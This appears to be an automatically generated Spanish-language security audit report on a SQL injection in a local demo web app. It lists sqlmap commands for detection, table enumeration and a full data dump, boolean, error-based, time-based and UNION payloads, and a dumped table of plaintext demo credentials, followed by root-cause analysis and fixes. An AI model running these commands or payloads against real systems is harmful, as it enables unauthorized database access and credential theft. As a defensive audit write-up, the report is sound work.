# Informe de Auditoría de Seguridad — SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-21T07:04:05Z  
**Herramientas:** curl, sqlmap 1.10.2  
**Clasificación:** CRÍTICO

---

## 1. Resumen Ejecutivo

Se realizó un análisis de seguridad dinámica (DAST) sobre la aplicación web en `http://web.dev.local:8083`. Se identificó y explotó con éxito una vulnerabilidad de **SQL Injection** en el parámetro GET `id`. El atacante puede extraer la totalidad de la base de datos sin autenticación, incluyendo credenciales en texto claro.

**Severidad:** 🔴 CRÍTICA (CVSS v3: ~9.8)

---

## 2. Fase 1: Reconocimiento

### 2.1 Inspección de la Página Principal

```
GET http://web.dev.local:8083/
```

La página presenta un formulario HTML con método `GET` y un único campo de entrada:

```html
<form action="#" method="GET">
  <input type="text" name="id" id="id" placeholder="Ingresa un ID de usuario">
  <input type="submit" name="Submit" value="Submit">
</form>
```

### 2.2 Vectores de Entrada Identificados

| # | Tipo | Parámetro | URL |
|---|------|-----------|-----|
| 1 | GET  | `id`      | `http://web.dev.local:8083/?id=<valor>&Submit=Submit` |

Prueba inicial con `id=1` devuelve:
```
ID: 1
First name: John
Surname: Doe
```

El servidor responde con datos de usuario, confirmando que el parámetro interactúa directamente con la base de datos.

---

## 3. Fase 2: Escaneo de Vulnerabilidades

### 3.1 Comando sqlmap (Detección)

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" \
  --batch --level=2 --risk=2 --dbs --current-user --current-db
```

### 3.2 Resultado — Parámetro Vulnerable Confirmado

sqlmap confirmó **4 tipos de inyección** sobre el parámetro `id`:

| Tipo | Técnica | Payload |
|------|---------|---------|
| Boolean-based blind | OR NOT | `id=1' OR NOT 8214=8214-- AqsF` |
| Error-based | EXTRACTVALUE | `id=1' AND EXTRACTVALUE(7830,CONCAT(0x5c,...))-- vHQx` |
| Time-based blind | SLEEP | `id=1' AND (SELECT 5876 FROM (SELECT(SLEEP(5)))XpeC)-- tpQt` |
| UNION query | NULL (2 cols) | `id=1' UNION ALL SELECT CONCAT(...),NULL-- -` |

**Información del backend:**
- DBMS: MySQL >= 5.1 (MariaDB fork)
- OS: Linux Debian
- Web Tech: PHP 8.1.33, Apache 2.4.65
- Usuario DB: `root@%` ⚠️ (privilegios máximos)
- Base de datos activa: `sqli_demo`

**Bases de datos enumeradas:**
```
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli_demo
[*] sys
```

---

## 4. Fase 3: Explotación Activa

### 4.1 Enumeración de Tablas

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" \
  --batch -D sqli_demo --tables
```

```
Database: sqli_demo
[1 table]
+-------+
| users |
+-------+
```

### 4.2 Volcado Completo de Credenciales

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" \
  --batch -D sqli_demo -T users --dump
```

#### Tabla `sqli_demo.users` — Datos Exfiltrados

| user_id | username  | first_name | last_name | email               | password    |
|---------|-----------|------------|-----------|---------------------|-------------|
| 1       | admin     | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith    | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson  | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown    | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis    | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller   | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson   | Frank      | Wilson    | frank@example.com   | admin123    |

✅ **Explotación exitosa**: Se extrajeron 8 registros con credenciales en **texto claro**.

---

## 5. Análisis de Impacto

| Dimensión | Impacto |
|-----------|---------|
| **Confidencialidad** | Total — credenciales de todos los usuarios expuestas |
| **Integridad** | Alta — el usuario DB es `root@%`, puede modificar/borrar datos |
| **Disponibilidad** | Alta — posible DROP TABLE / DROP DATABASE |
| **Escalada** | Alta — contraseñas en texto plano permiten ataques de credential stuffing |

---

## 6. Causa Raíz

La aplicación construye la consulta SQL concatenando directamente el valor del parámetro `id` sin sanitización ni uso de consultas parametrizadas (prepared statements):

```php
// Código vulnerable (probable):
$query = "SELECT * FROM users WHERE user_id = '$id'";
```

El valor de `id` nunca es validado ni escapado.

---

## 7. Recomendaciones

1. **Usar Prepared Statements / Consultas Parametrizadas** (prioridad máxima):
   ```php
   $stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
   $stmt->execute([$id]);
   ```
2. **Hashear contraseñas** (bcrypt/argon2) — nunca almacenar en texto claro.
3. **Principio de mínimo privilegio** — la aplicación no debe conectarse a la DB como `root`.
4. **WAF** — implementar un Web Application Firewall para detectar patrones SQLi.
5. **Validación de entrada** — validar que `id` sea un entero antes de usarlo.

---

## 8. Conclusión

La aplicación en `http://web.dev.local:8083` presenta una vulnerabilidad **crítica de SQL Injection** en el parámetro GET `id`. La explotación fue trivial (sin autenticación, un solo parámetro) y resultó en la exfiltración completa de la tabla de usuarios con contraseñas en texto claro. El usuario de base de datos `root@%` amplía el riesgo a toda la instancia MySQL. Se requiere corrección inmediata.

---
*Informe generado automáticamente por Agente DAST — 2026-04-21T07:04:05Z*
